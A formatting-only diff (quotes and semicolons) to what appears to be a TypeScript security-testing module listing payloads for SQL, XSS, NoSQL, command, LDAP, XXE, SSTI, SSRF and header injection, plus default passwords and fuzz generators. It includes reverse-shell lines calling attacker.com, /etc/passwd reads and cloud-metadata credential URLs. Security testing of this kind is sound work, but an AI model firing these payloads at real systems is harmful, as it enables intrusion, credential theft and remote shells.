@@ -51,7 +51,7 @@ export const SQL_INJECTION_PAYLOADS = [
   // MySQL specific
   "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
   "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-];
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // XSS PAYLOADS
@@ -59,45 +59,45 @@ export const SQL_INJECTION_PAYLOADS = [
 
 export const XSS_PAYLOADS = [
   // Basic script injection
-  '<script>alert(1)</script>',
+  "<script>alert(1)</script>",
   '<script>alert("XSS")</script>',
-  '<script>alert(document.cookie)</script>',
+  "<script>alert(document.cookie)</script>",
 
   // Event handlers
-  '<img src=x onerror=alert(1)>',
-  '<svg onload=alert(1)>',
-  '<body onload=alert(1)>',
-  '<input onfocus=alert(1) autofocus>',
-  '<marquee onstart=alert(1)>',
-  '<video src=x onerror=alert(1)>',
-  '<audio src=x onerror=alert(1)>',
+  "<img src=x onerror=alert(1)>",
+  "<svg onload=alert(1)>",
+  "<body onload=alert(1)>",
+  "<input onfocus=alert(1) autofocus>",
+  "<marquee onstart=alert(1)>",
+  "<video src=x onerror=alert(1)>",
+  "<audio src=x onerror=alert(1)>",
 
   // Encoded payloads
-  '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>',
-  '<script>\\u0061lert(1)</script>',
+  "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>",
+  "<script>\\u0061lert(1)</script>",
 
   // JavaScript URI
-  'javascript:alert(1)',
-  'javascript:alert(document.domain)',
+  "javascript:alert(1)",
+  "javascript:alert(document.domain)",
 
   // Data URI
   '<a href="data:text/html,<script>alert(1)</script>">click</a>',
 
   // SVG-based
-  '<svg><script>alert(1)</script></svg>',
-  '<svg><animate onbegin=alert(1)>',
+  "<svg><script>alert(1)</script></svg>",
+  "<svg><animate onbegin=alert(1)>",
 
   // Polyglot
-  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
+  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
 
   // DOM-based
-  '#<script>alert(1)</script>',
+  "#<script>alert(1)</script>",
 
   // Template injection
   '{{constructor.constructor("alert(1)")()}}',
-  '${alert(1)}',
-  '#{alert(1)}',
-];
+  "${alert(1)}",
+  "#{alert(1)}",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // NOSQL INJECTION PAYLOADS
@@ -111,15 +111,15 @@ export const NOSQL_INJECTION_PAYLOADS = [
   '{"$regex": ".*"}',
 
   // Operator injection
-  { $gt: '' },
+  { $gt: "" },
   { $ne: null },
   { $exists: true },
-  { $regex: '.*' },
+  { $regex: ".*" },
 
   // JavaScript injection
   '"; return true; //',
-  '1; return true; //',
-];
+  "1; return true; //",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // COMMAND INJECTION PAYLOADS
@@ -127,34 +127,34 @@ export const NOSQL_INJECTION_PAYLOADS = [
 
 export const COMMAND_INJECTION_PAYLOADS = [
   // Basic command chaining
-  '; ls -la',
-  '| ls -la',
-  '`ls -la`',
-  '$(ls -la)',
-  '&& ls -la',
-  '|| ls -la',
+  "; ls -la",
+  "| ls -la",
+  "`ls -la`",
+  "$(ls -la)",
+  "&& ls -la",
+  "|| ls -la",
 
   // Blind injection
-  '; sleep 5',
-  '| sleep 5',
-  '`sleep 5`',
-  '$(sleep 5)',
+  "; sleep 5",
+  "| sleep 5",
+  "`sleep 5`",
+  "$(sleep 5)",
 
   // Windows commands
-  '& dir',
-  '| dir',
-  '; dir',
+  "& dir",
+  "| dir",
+  "; dir",
 
   // Reading files
-  '; cat /etc/passwd',
-  '| cat /etc/passwd',
-  '`cat /etc/passwd`',
-  '$(cat /etc/passwd)',
+  "; cat /etc/passwd",
+  "| cat /etc/passwd",
+  "`cat /etc/passwd`",
+  "$(cat /etc/passwd)",
 
   // Reverse shell attempts (for detection only)
-  '; nc -e /bin/sh attacker.com 1234',
-  '| bash -i >& /dev/tcp/attacker.com/1234 0>&1',
-];
+  "; nc -e /bin/sh attacker.com 1234",
+  "| bash -i >& /dev/tcp/attacker.com/1234 0>&1",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // PATH TRAVERSAL PAYLOADS
@@ -162,40 +162,40 @@ export const COMMAND_INJECTION_PAYLOADS = [
 
 export const PATH_TRAVERSAL_PAYLOADS = [
   // Basic traversal
-  '../../../etc/passwd',
-  '..\\..\\..\\windows\\system.ini',
+  "../../../etc/passwd",
+  "..\\..\\..\\windows\\system.ini",
 
   // Encoded
-  '..%2f..%2f..%2fetc%2fpasswd',
-  '..%252f..%252f..%252fetc%252fpasswd',
-  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
+  "..%2f..%2f..%2fetc%2fpasswd",
+  "..%252f..%252f..%252fetc%252fpasswd",
+  "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
 
   // Double encoding
-  '....//....//....//etc/passwd',
-  '....\\\\....\\\\....\\\\windows\\\\system.ini',
+  "....//....//....//etc/passwd",
+  "....\\\\....\\\\....\\\\windows\\\\system.ini",
 
   // Null byte
-  '../../../etc/passwd%00',
-  '../../../etc/passwd%00.jpg',
+  "../../../etc/passwd%00",
+  "../../../etc/passwd%00.jpg",
 
   // Wrapper bypass
-  '....//....//....//etc/passwd',
-  '..//..//..//etc/passwd',
-];
+  "....//....//....//etc/passwd",
+  "..//..//..//etc/passwd",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // LDAP INJECTION PAYLOADS
 // ════════════════════════════════════════════════════════════════════════════════
 
 export const LDAP_INJECTION_PAYLOADS = [
-  '*',
-  '*)(&',
-  '*)(uid=*))(|(uid=*',
-  '*()|&\'',
-  'admin)(&)',
-  'admin)(|(password=*))',
-  '*)((|userPassword=*)',
-];
+  "*",
+  "*)(&",
+  "*)(uid=*))(|(uid=*",
+  "*()|&'",
+  "admin)(&)",
+  "admin)(|(password=*))",
+  "*)((|userPassword=*)",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // XML/XXE PAYLOADS
@@ -213,7 +213,7 @@ export const XXE_PAYLOADS = [
 
   // SSRF via XXE
   `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
-];
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // SSTI (SERVER-SIDE TEMPLATE INJECTION) PAYLOADS
@@ -221,15 +221,15 @@ export const XXE_PAYLOADS = [
 
 export const SSTI_PAYLOADS = [
   // Detection
-  '{{7*7}}',
-  '${7*7}',
-  '<%= 7*7 %>',
-  '#{7*7}',
-  '*{7*7}',
+  "{{7*7}}",
+  "${7*7}",
+  "<%= 7*7 %>",
+  "#{7*7}",
+  "*{7*7}",
 
   // Jinja2/Twig
-  '{{config}}',
-  '{{self.__class__.__mro__}}',
+  "{{config}}",
+  "{{self.__class__.__mro__}}",
   "{{''.__class__.__mro__[2].__subclasses__()}}",
 
   // Freemarker
@@ -237,7 +237,7 @@ export const SSTI_PAYLOADS = [
 
   // Velocity
   '#set($str=$class.inspect("java.lang.String").type)',
-];
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // SSRF PAYLOADS
@@ -245,33 +245,33 @@ export const SSTI_PAYLOADS = [
 
 export const SSRF_PAYLOADS = [
   // Local addresses
-  'http://localhost/',
-  'http://127.0.0.1/',
-  'http://[::1]/',
-  'http://0.0.0.0/',
-  'http://127.1/',
+  "http://localhost/",
+  "http://127.0.0.1/",
+  "http://[::1]/",
+  "http://0.0.0.0/",
+  "http://127.1/",
 
   // Cloud metadata
-  'http://169.254.169.254/latest/meta-data/',
-  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
-  'http://metadata.google.internal/',
-  'http://100.100.100.200/latest/meta-data/',
+  "http://169.254.169.254/latest/meta-data/",
+  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+  "http://metadata.google.internal/",
+  "http://100.100.100.200/latest/meta-data/",
 
   // Internal networks
-  'http://192.168.1.1/',
-  'http://10.0.0.1/',
-  'http://172.16.0.1/',
+  "http://192.168.1.1/",
+  "http://10.0.0.1/",
+  "http://172.16.0.1/",
 
   // Protocol bypass
-  'file:///etc/passwd',
-  'gopher://localhost:25/',
-  'dict://localhost:11211/',
+  "file:///etc/passwd",
+  "gopher://localhost:25/",
+  "dict://localhost:11211/",
 
   // IP obfuscation
-  'http://2130706433/', // 127.0.0.1 in decimal
-  'http://0x7f000001/', // 127.0.0.1 in hex
-  'http://127.0.0.1.nip.io/',
-];
+  "http://2130706433/", // 127.0.0.1 in decimal
+  "http://0x7f000001/", // 127.0.0.1 in hex
+  "http://127.0.0.1.nip.io/",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // AUTHENTICATION BYPASS PAYLOADS
@@ -279,35 +279,35 @@ export const SSRF_PAYLOADS = [
 
 export const AUTH_BYPASS_PAYLOADS = {
   emails: [
-    'admin@company.com',
-    'administrator@company.com',
-    'root@company.com',
-    'admin@admin.com',
-    'test@test.com',
+    "admin@company.com",
+    "administrator@company.com",
+    "root@company.com",
+    "admin@admin.com",
+    "test@test.com",
   ],
   passwords: [
-    'admin',
-    'password',
-    'password123',
-    '123456',
-    'admin123',
-    'root',
-    'test',
-    'guest',
-    'default',
+    "admin",
+    "password",
+    "password123",
+    "123456",
+    "admin123",
+    "root",
+    "test",
+    "guest",
+    "default",
   ],
-};
+}
 
 // ════════════════════════════════════════════════════════════════════════════════
 // HEADER INJECTION PAYLOADS
 // ════════════════════════════════════════════════════════════════════════════════
 
 export const HEADER_INJECTION_PAYLOADS = [
-  'test\r\nX-Injected: header',
-  'test\nX-Injected: header',
-  'test%0d%0aX-Injected:%20header',
-  'test%0aX-Injected:%20header',
-];
+  "test\r\nX-Injected: header",
+  "test\nX-Injected: header",
+  "test%0d%0aX-Injected:%20header",
+  "test%0aX-Injected:%20header",
+]
 
 // ════════════════════════════════════════════════════════════════════════════════
 // PAYLOAD GENERATORS
@@ -318,20 +318,20 @@ export function generateFuzzPayloads(baseValue: string): string[] {
     baseValue,
     baseValue + "'",
     baseValue + '"',
-    baseValue + '`',
-    baseValue + '<',
-    baseValue + '>',
-    baseValue + '\\',
-    baseValue + '/',
-    baseValue + '%00',
-    baseValue + '%0a',
-    baseValue + '%0d',
+    baseValue + "`",
+    baseValue + "<",
+    baseValue + ">",
+    baseValue + "\\",
+    baseValue + "/",
+    baseValue + "%00",
+    baseValue + "%0a",
+    baseValue + "%0d",
     baseValue.repeat(1000), // Buffer overflow attempt
-    'A'.repeat(10000), // Large input
-    '', // Empty input
-    ' ', // Whitespace only
-    '\t\n\r', // Special whitespace
-  ];
+    "A".repeat(10000), // Large input
+    "", // Empty input
+    " ", // Whitespace only
+    "\t\n\r", // Special whitespace
+  ]
 }
 
 export function generateNumericFuzzPayloads(): (number | string)[] {
@@ -349,14 +349,14 @@ export function generateNumericFuzzPayloads(): (number | string)[] {
     Infinity,
     -Infinity,
     NaN,
-    'NaN',
-    'Infinity',
-    '1e308',
-    '1e-308',
-    '0x1',
-    '0o1',
-    '0b1',
-  ];
+    "NaN",
+    "Infinity",
+    "1e308",
+    "1e-308",
+    "0x1",
+    "0o1",
+    "0b1",
+  ]
 }
 
 export default {
@@ -373,4 +373,4 @@ export default {
   HEADER_INJECTION_PAYLOADS,
   generateFuzzPayloads,
   generateNumericFuzzPayloads,
-};
+}
